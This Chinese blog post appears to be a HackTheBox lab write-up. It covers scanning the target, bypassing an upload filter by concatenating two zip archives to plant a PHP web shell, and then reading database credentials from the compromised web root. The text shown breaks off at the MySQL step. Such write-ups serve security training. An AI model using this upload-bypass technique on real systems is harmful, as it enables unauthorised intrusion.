<!DOCTYPE html>
<html lang="zh">

<head>
  <!-- Website mata -->
<meta charset="UTF-8" />
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />

<!-- Disable transformation -->
<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />

<meta name="theme-color" content="#f8f5ec" />
<meta name="msapplication-navbutton-color" content="#f8f5ec">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">

<!-- Website description -->

<meta name="description" content="HackTheBox——HTB Certificate Writeup" />


<!-- Website keywords -->

<meta name="keywords" content="writeup, N0nome`s Fucking Life" />




<!-- Website rss -->

<link rel="alternate" href="/default" title="N0nome`s Fucking Life" >


<!-- Website favicon -->

<link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=3.0.0" />


<!-- Canonical, good for google search engine -->
<link rel="canonical" href="https://n0nome.github.io/2025/06/19/Certificate/Certificate/" />

<!-- Fancybox styling -->

<link rel="stylesheet" type="text/css" href="/lib/fancybox/jquery.fancybox.css" />


<!-- MathJax (LaTeX) support -->


<!-- Theme styling -->
<link rel="stylesheet" type="text/css" href="/css/style.css?v=3.0.0" />

<!-- Analytics and push -->



  



<!-- LeanCloud Counter -->


<script>
  window.config = {"leancloud":{"app_id":null,"app_key":null,"server_url":null,"cdn":null},"toc":true,"fancybox":true,"latex":false};
</script>
  
  <title>HackTheBox——HTB Certificate Writeup - N0nome`s Fucking Life</title>

<meta name="generator" content="Hexo 7.3.0"></head>

<body>
  <div class="scrollPercentage"></div>
  <div id="mobile-navbar" class="mobile-navbar">
  <div class="mobile-header-logo">
    <a href="/." class="logo">N0nome`s Fucking Life</a>
  </div>
  <div class="mobile-navbar-icon">
    <span></span>
    <span></span>
    <span></span>
  </div>
</div>

<nav id="mobile-menu" class="mobile-menu slideout-menu">
  <ul class="mobile-menu-list">
    
    <a href="/">
      <li class="mobile-menu-item">
        
        
        Home              </li>
    </a>
    
    <a href="/tags/">
      <li class="mobile-menu-item">
        
        
        Tags              </li>
    </a>
    
    <a href="/about/">
      <li class="mobile-menu-item">
        
        
        About              </li>
    </a>
    
  </ul>
</nav>
  <div class="container" id="mobile-panel">
    <header id="header" class="header">
      <div class="logo-wrapper">  
  <a href="/." class="logo">N0nome`s Fucking Life</a>  
</div>  
  
<nav class="site-navbar">  
    
    <ul id="menu" class="menu">  
        
        <li class="menu-item">  
          <a class="menu-item-link" href="/">  
              
              
              Home  
              
          </a>  
        </li>  
        
        <li class="menu-item">  
          <a class="menu-item-link" href="/tags/">  
              
              
              Tags  
              
          </a>  
        </li>  
        
        <li class="menu-item">  
          <a class="menu-item-link" href="/about/">  
              
              
              About  
              
          </a>  
        </li>  
        
    </ul>  
    
</nav>  

    </header>
    <main id="main" class="main">
      <div class="content-wrapper">
        <div id="content" class="content">
          <article class="post">
  <header class="post-header">
    <h1 class="post-title">
      
      HackTheBox——HTB Certificate Writeup
      
    </h1>

    <div class="post-meta">
      <span class="post-time">
        2025-06-19
      </span>
      
      
      
    </div>
  </header>

  
  <div class="post-toc" id="post-toc">
    <h2 class="post-toc-title">Contents</h2>
    <div class="post-toc-content">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#nmap"><span class="toc-number">1.</span> <span class="toc-text">nmap</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#80"><span class="toc-number">1.1.</span> <span class="toc-text">80</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#zip%E6%96%87%E4%BB%B6%E4%B8%B2%E8%81%94"><span class="toc-number">1.2.</span> <span class="toc-text">zip文件串联</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shell-as-xamppuser"><span class="toc-number">2.</span> <span class="toc-text">shell as xamppuser</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#get-hash-in-mysql-and-crack"><span class="toc-number">2.1.</span> <span class="toc-text">get hash in mysql and crack</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shell-as-sara-b"><span class="toc-number">3.</span> <span class="toc-text">shell as sara.b</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#account-operators"><span class="toc-number">3.1.</span> <span class="toc-text">account operators</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Analyzing-pcap-files"><span class="toc-number">3.2.</span> <span class="toc-text">Analyzing pcap files</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shell-as-lion-sk"><span class="toc-number">4.</span> <span class="toc-text">shell as lion.sk</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#exploit-ESC3"><span class="toc-number">4.1.</span> <span class="toc-text">exploit ESC3</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shell-as-ryan-k"><span class="toc-number">5.</span> <span class="toc-text">shell as ryan.k</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SeManageVolumeExploit-exe-and-Gloden-Certificate-Attack"><span class="toc-number">5.1.</span> <span class="toc-text">SeManageVolumeExploit.exe and Gloden Certificate Attack</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Hashes"><span class="toc-number">6.</span> <span class="toc-text">Hashes</span></a></li></ol>
    </div>
  </div>
  

  <div class="post-content">
    
    <p>Welcome to N0nome&#96;s F**king <a href="https://n0nome.github.io/">blog</a>.<br>(:This is just a joke:)<br><a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8uK3T">Do you want to become stronger than me? You just need to move your hands more.</a></p>
<p><code>鉴于博主学识浅薄，文中只写通关，其中利害关系还需要各位Google学习</code><br><img src="/images/certificate-25.png"></p>
<h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE       VERSION                                                                                                                        </span><br><span class="line">53/tcp    open  domain        Simple DNS Plus                                                                                                                </span><br><span class="line">80/tcp    open  http          Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.0.30)                                                                                 </span><br><span class="line">|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.0.30                                                                                         </span><br><span class="line">|_http-title: Did not follow redirect to http://certificate.htb/                                                                                             </span><br><span class="line">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server <span class="keyword">time</span>: 2025-06-01 07:36:02Z)                                                                 </span><br><span class="line">135/tcp   open  msrpc         Microsoft Windows RPC                                                                                                          </span><br><span class="line">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)</span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2025-06-01T07:37:41+00:00; +7h38m40s from scanner <span class="keyword">time</span>.</span><br><span class="line">| ssl-cert: Subject: commonName=DC01.certificate.htb             </span><br><span class="line">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.certificate.htb</span><br><span class="line">| Not valid before: 2024-11-04T03:14:54            </span><br><span class="line">|_Not valid after:  2025-11-04T03:14:54            </span><br><span class="line">445/tcp   open  microsoft-ds?                                                 </span><br><span class="line">464/tcp   open  kpasswd5?                                                     </span><br><span class="line">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0                                                                                            </span><br><span class="line">636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject: commonName=DC01.certificate.htb    </span><br><span class="line">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.certificate.htb</span><br><span class="line">| Not valid before: 2024-11-04T03:14:54                                                                                                                      </span><br><span class="line">|_Not valid after:  2025-11-04T03:14:54                  </span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2025-06-01T07:37:42+00:00; +7h38m40s from scanner <span class="keyword">time</span>.                                                                                          </span><br><span class="line">3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)</span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2025-06-01T07:37:41+00:00; +7h38m40s from scanner <span class="keyword">time</span>.</span><br><span class="line">| ssl-cert: Subject: commonName=DC01.certificate.htb</span><br><span class="line">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.certificate.htb</span><br><span class="line">| Not valid before: 2024-11-04T03:14:54 </span><br><span class="line">|_Not valid after:  2025-11-04T03:14:54 </span><br><span class="line">3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)                             </span><br><span class="line">| ssl-cert: Subject: commonName=DC01.certificate.htb                                                                                                         </span><br><span class="line">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.certificate.htb</span><br><span class="line">| Not valid before: 2024-11-04T03:14:54 </span><br><span class="line">|_Not valid after:  2025-11-04T03:14:54 </span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2025-06-01T07:37:42+00:00; +7h38m40s from scanner <span class="keyword">time</span>.</span><br><span class="line">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">9389/tcp  open  mc-nmf        .NET Message Framing</span><br><span class="line">49667/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49691/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49692/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49693/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49709/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49715/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49734/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)</span><br><span class="line">OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10</span><br><span class="line">Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)</span><br><span class="line">No exact OS matches <span class="keyword">for</span> host (<span class="built_in">test</span> conditions non-ideal).</span><br><span class="line">Service Info: Hosts: certificate.htb, DC01; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line">Host script results:</span><br><span class="line">| smb2-time: </span><br><span class="line">|   <span class="built_in">date</span>: 2025-06-01T07:37:02</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   3:1:1: </span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">|_clock-skew: mean: 7h38m39s, deviation: 0s, median: 7h38m39s</span><br></pre></td></tr></table></figure>
<p>先加一下hosts</p>
<h3 id="80"><a href="#80" class="headerlink" title="80"></a>80</h3><p><img src="/images/certificate.png"><br>看起来平平无奇<br>有个注册和登录<br>还是模糊测试一下子域和目录吧<br>子域没扫出什么来</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">$ dirsearch -u http://certificate.htb                                                                                                                                       10:45:18 [27/762]</span><br><span class="line">/usr/share/dirsearch/lib/core/installation.py:24: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package </span><br><span class="line">is slated <span class="keyword">for</span> removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools&lt;81.</span><br><span class="line">  import pkg_resources                                                                        </span><br><span class="line">                                                                                              </span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.3                                                              </span><br><span class="line"> (_||| _) (/_(_|| (_| )                                                                       </span><br><span class="line">                                                                                              </span><br><span class="line">Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25 | Wordlist size: 12289</span><br><span class="line">                                                                                              </span><br><span class="line">Target: http://certificate.htb/                                                               </span><br><span class="line">                                                                                              </span><br><span class="line">[10:42:24] Scanning:                                                                          </span><br><span class="line">[10:43:53] 200 -   14KB - /about.php            </span><br><span class="line">[10:44:39] 403 -   304B - /cgi-bin/             </span><br><span class="line">[10:44:40] 500 -   638B - /cgi-bin/printenv.pl  </span><br><span class="line">[10:44:52] 200 -     0B - /db.php               </span><br><span class="line">[10:45:01] 503 -   404B - /examples/            </span><br><span class="line">[10:45:01] 503 -   404B - /examples/jsp/%252e%252e/%252e%252e/manager/html/                                                                                                                  </span><br><span class="line">[10:45:01] 503 -   404B - /examples/jsp/snp/snoop.jsp                    </span><br><span class="line">[10:45:01] 503 -   404B - /examples/websocket/index.xhtml</span><br><span class="line">[10:45:01] 503 -   404B - /examples/servlet/SnoopServlet</span><br><span class="line">[10:45:01] 503 -   404B - /examples             </span><br><span class="line">[10:45:01] 503 -   404B - /examples/servlets/servlet/RequestHeaderExample</span><br><span class="line">[10:45:01] 503 -   404B - /examples/servlets/index.html</span><br><span class="line">[10:45:01] 503 -   404B - /examples/servlets/servlet/CookieExample</span><br><span class="line">[10:45:01] 503 -   404B - /examples/jsp/index.html</span><br><span class="line">[10:45:06] 200 -    3KB - /footer.php                   </span><br><span class="line">[10:45:11] 200 -    2KB - /header.php                                                                                                                                                        </span><br><span class="line">[10:45:17] 403 -   304B - /index.php::<span class="variable">$DATA</span>     </span><br><span class="line">[10:45:17] 200 -   22KB - /index.php            </span><br><span class="line">[10:45:17] 200 -   22KB - /index.pHp            </span><br><span class="line">[10:45:17] 200 -   22KB - /index.php/login/  </span><br><span class="line">[10:45:17] 200 -   22KB - /index.php.           </span><br><span class="line">[10:45:21] 200 -    9KB - /login.php            </span><br><span class="line">[10:45:21] 302 -     0B - /logout.php  -&gt;  login.php</span><br><span class="line">[10:45:43] 403 -   423B - /phpmyadmin           </span><br><span class="line">[10:45:45] 403 -   423B - /phpmyadmin/          </span><br><span class="line">[10:45:45] 403 -   423B - /phpmyadmin/index.php </span><br><span class="line">[10:45:45] 403 -   423B - /phpmyadmin/ChangeLog </span><br><span class="line">[10:45:45] 403 -   423B - /phpmyadmin/docs/html/index.html</span><br><span class="line">[10:45:45] 403 -   423B - /phpmyadmin/doc/html/index.html</span><br><span class="line">[10:45:45] 403 -   423B - /phpmyadmin/phpmyadmin/index.php</span><br><span class="line">[10:45:45] 403 -   423B - /phpmyadmin/scripts/setup.php</span><br><span class="line">[10:45:45] 403 -   423B - /phpmyadmin/README    </span><br><span class="line">[10:45:55] 200 -   11KB - /register.php         </span><br><span class="line">[10:46:00] 403 -   423B - /server-status        </span><br><span class="line">[10:46:00] 403 -   423B - /server-info          </span><br><span class="line">[10:46:00] 403 -   423B - /server-status/       </span><br><span class="line">[10:46:10] 301 -   343B - /static  -&gt;  http://certificate.htb/static/                          </span><br><span class="line">[10:46:10] 301 -   345B - /static..  -&gt;  http://certificate.htb/static../</span><br><span class="line">[10:46:20] 403 -   304B - /Trace.axd::<span class="variable">$DATA</span>     </span><br><span class="line">[10:46:21] 302 -     0B - /upload.php  -&gt;  login.php</span><br><span class="line">[10:46:28] 403 -   304B - /web.config::<span class="variable">$DATA</span>    </span><br><span class="line">[10:46:29] 403 -   304B - /webalizer            </span><br><span class="line">[10:46:29] 403 -   304B - /webalizer/</span><br></pre></td></tr></table></figure>
<p>有一个db.php，但是是个白页，还是注册吧<br>注册了一个登录进去但是是个白页<br><img src="/images/certificate-1.png"><br>嗷，角色选教师的话会是白页<br>正常选学生的话会直接跳转到<br><img src="/images/certificate-2.png"><br><img src="/images/certificate-3.png"><br>在里面找一个课程点进去<br>这里的submit没啥用没往下滑<br><img src="/images/certificate-4.png"><br>还有watch和submit<br>只有submit有用，会跳转到upload.php，但是跟了参数<br><img src="/images/certificate-5.png"><br>图中还说了只要<code> .pdf .docx .pptx .xlsx</code><br>    Please select the assignment file you want to upload (the file will be reviewed by the course instructor)<br>    We accept only the following file types: .pdf .docx .pptx .xlsx<br>    You include the assignment file in .zip archive file to reduce it’s size<br>    请选择您要上传的作业文件（文件将由课程讲师审核）<br>    我们仅接受以下文件类型：.pdf .docx .pptx .xlsx<br>    请将作业文件包含在 .zip 压缩包中以减小其大小<br>看看能不能绕过一下<br>上burp<br>这也没啥用<br><img src="/images/certificate-6.png"></p>
<h3 id="zip文件串联"><a href="#zip文件串联" class="headerlink" title="zip文件串联"></a>zip文件串联</h3><p>zip传不上去呀，Google一下<code>zip bypass windows</code><br>然后可以找到很多有关于<code>CVE-2025-0411</code>的文章，我翻到了<a target="_blank" rel="noopener" href="https://www.pcworld.com/article/2599106/update-now-this-7-zip-exploit-bypasses-crucial-windows-protections.html">Update now! This 7-Zip exploit bypasses crucial Windows protections</a><br>那我再给他压缩一遍试试<br><img src="/images/certificate-7.png"><br><img src="/images/certificate-8.png"><br>点那个here会直接跳转到上传的页面，因为我上传的是一个zip，他会直接下载<br><img src="/images/certificate-9.png"><br>这怎么搞，继续Google<br>找到了一个叫<a target="_blank" rel="noopener" href="https://duckduckgo.com/?t=h_&q=zip%E6%96%87%E4%BB%B6%E8%A7%84%E9%81%BFWindows%E6%96%87%E4%BB%B6%E6%A3%80%E6%B5%8B&ia=web">zip文件串联</a>的东西（其中的知识可以Google学习一下）<br>那我们打包串联两个zip文件，一个随便给一个，另一个写我们的恶意shell</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> <span class="string">&#x27;Ctrl+Alt&#x27;</span> &gt; out.pdf</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">cat</span> out.pdf </span><br><span class="line">Ctrl+Alt</span><br><span class="line"></span><br><span class="line">$ zip out.zip out.pdf </span><br><span class="line">  adding: out.pdf (stored 0%)</span><br><span class="line"></span><br><span class="line">$ nano shell.php</span><br><span class="line"></span><br><span class="line">$ zip shell.zip shell.php </span><br><span class="line">  adding: shell.php (deflated 32%)</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">cat</span> out.zip shell.zip &gt; xxx.zip</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">ls</span> -la</span><br><span class="line">drwxr-xr-x wansh wansh 190 B  Tue Jun  3 10:04:41 2025  .</span><br><span class="line">drwxr-xr-x wansh wansh  70 B  Sun Jun  1 15:38:04 2025  ..</span><br><span class="line">.rw-r--r-- root  root  4.8 KB Sun Jun  1 15:59:49 2025  nmap.txt</span><br><span class="line">.rw-r--r-- wansh wansh   9 B  Tue Jun  3 10:02:30 2025  out.pdf</span><br><span class="line">.rw-r--r-- wansh wansh 173 B  Tue Jun  3 10:02:41 2025  out.zip</span><br><span class="line">.rw-r--r-- wansh wansh 348 B  Tue Jun  3 10:04:35 2025  shell.php</span><br><span class="line">.rw-r--r-- wansh wansh 406 B  Tue Jun  3 10:04:41 2025  shell.zip</span><br><span class="line">.rw-r--r-- wansh wansh 348 B  Mon Jun  2 11:41:59 2025  xxx.php</span><br><span class="line">.rw-r--r-- wansh wansh 579 B  Tue Jun  3 10:04:56 2025  xxx.zip</span><br><span class="line">.rw-r--r-- wansh wansh 566 B  Mon Jun  2 13:15:57 2025  xxx1.zip</span><br><span class="line">.rw-r--r-- wansh wansh 804 B  Mon Jun  2 13:29:58 2025  xxx2.zip</span><br></pre></td></tr></table></figure>
<p>上传试一下<br><img src="/images/certificate-10.png"><br>上传上去了，但是是其中另一个的，改一下url<br><img src="/images/certificate-11.png"><br>ok了，拿到了一个xamppuser的用户</p>
<h2 id="shell-as-xamppuser"><a href="#shell-as-xamppuser" class="headerlink" title="shell as xamppuser"></a>shell as xamppuser</h2><p>根据这个名字，猜想根目录下应该有xampp的文件夹</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">PS C:\&gt; <span class="built_in">dir</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name                                                                  </span><br><span class="line">----                -------------         ------ ----                                                                  </span><br><span class="line">d-----        11/5/2022  11:58 AM                PerfLogs                                                              </span><br><span class="line">d-r---        4/28/2025   2:26 PM                Program Files                                                         </span><br><span class="line">d-----        9/15/2018  12:21 AM                Program Files (x86)                                                   </span><br><span class="line">d-r---       12/29/2024   5:30 PM                Users                                                                 </span><br><span class="line">d-----         5/5/2025  11:42 AM                Windows                                                               </span><br><span class="line">d-----       12/29/2024   6:33 PM                xampp     </span><br></pre></td></tr></table></figure>
<p>oh yes yes<br>进去翻一翻</p>
<h3 id="get-hash-in-mysql-and-crack"><a href="#get-hash-in-mysql-and-crack" class="headerlink" title="get hash in mysql and crack"></a>get hash in mysql and crack</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">PS C:\xampp\htdocs\certificate.htb&gt; <span class="built_in">dir</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\xampp\htdocs\certificate.htb</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name                                                                  </span><br><span class="line">----                -------------         ------ ----                                                                  </span><br><span class="line">d-----       12/26/2024   1:49 AM                static                                                                </span><br><span class="line">-a----       12/24/2024  12:45 AM           7179 about.php                                                             </span><br><span class="line">-a----       12/30/2024   1:50 PM          17197 blog.php                                                              </span><br><span class="line">-a----       12/30/2024   2:02 PM           6560 contacts.php                                                          </span><br><span class="line">-a----       12/24/2024   6:10 AM          15381 course-details.php                                                    </span><br><span class="line">-a----       12/24/2024  12:53 AM           4632 courses.php                                                           </span><br><span class="line">-a----       12/23/2024   4:46 AM            549 db.php                                                                </span><br><span class="line">-a----       12/22/2024  10:07 AM           1647 feature-area-2.php                                                    </span><br><span class="line">-a----       12/22/2024  10:22 AM           1331 feature-area.php                                                      </span><br><span class="line">-a----       12/22/2024  10:16 AM           2955 footer.php                                                            </span><br><span class="line">-a----       12/23/2024   5:13 AM           2351 header.php                                                            </span><br><span class="line">-a----       12/24/2024  12:52 AM           9497 index.php                                                             </span><br><span class="line">-a----       12/25/2024   1:34 PM           5908 login.php                                                             </span><br><span class="line">-a----       12/23/2024   5:14 AM            153 logout.php                                                            </span><br><span class="line">-a----       12/24/2024   1:27 AM           5321 popular-courses-area.php                                              </span><br><span class="line">-a----       12/25/2024   1:27 PM           8240 register.php                                                          </span><br><span class="line">-a----       12/28/2024  11:26 PM          10366 upload.php         </span><br></pre></td></tr></table></figure>
<p>在<code>C:\xampp\htdocs\certificate.htb</code>文件夹下面可以看到我们目录扫的时候出现的db.php，那我们直接看一下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">PS C:\xampp\htdocs\certificate.htb&gt; <span class="built_in">type</span> db.php</span><br><span class="line">&lt;?php</span><br><span class="line">// Database connection using PDO</span><br><span class="line">try &#123;</span><br><span class="line">    <span class="variable">$dsn</span> = <span class="string">&#x27;mysql:host=localhost;dbname=Certificate_WEBAPP_DB;charset=utf8mb4&#x27;</span>;</span><br><span class="line">    <span class="variable">$db_user</span> = <span class="string">&#x27;certificate_webapp_user&#x27;</span>; // Change to your DB username</span><br><span class="line">    <span class="variable">$db_passwd</span> = <span class="string">&#x27;cert!f!c@teDBPWD&#x27;</span>; // Change to your DB password</span><br><span class="line">    <span class="variable">$options</span> = [</span><br><span class="line">        PDO::ATTR_ERRMODE =&gt; PDO::ERRMODE_EXCEPTION,</span><br><span class="line">        PDO::ATTR_DEFAULT_FETCH_MODE =&gt; PDO::FETCH_ASSOC,</span><br><span class="line">    ];</span><br><span class="line">    <span class="variable">$pdo</span> = new PDO(<span class="variable">$dsn</span>, <span class="variable">$db_user</span>, <span class="variable">$db_passwd</span>, <span class="variable">$options</span>);</span><br><span class="line">&#125; catch (PDOException <span class="variable">$e</span>) &#123;</span><br><span class="line">    die(<span class="string">&#x27;Database connection failed: &#x27;</span> . <span class="variable">$e</span>-&gt;getMessage());</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>给了一个用户还有一个密码，看一下有没有在运行</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\xampp\htdocs\certificate.htb&gt; tasklist | findstr /i mysql</span><br><span class="line">mysqld.exe                    5012                            0     16,836 K</span><br></pre></td></tr></table></figure>
<p>有的，兄弟有的<br>mysql.exe在<code>PS C:\xampp\mysql\bin&gt;</code>文件夹中，我们可以利用一下看看数据库里面都有什么</p>
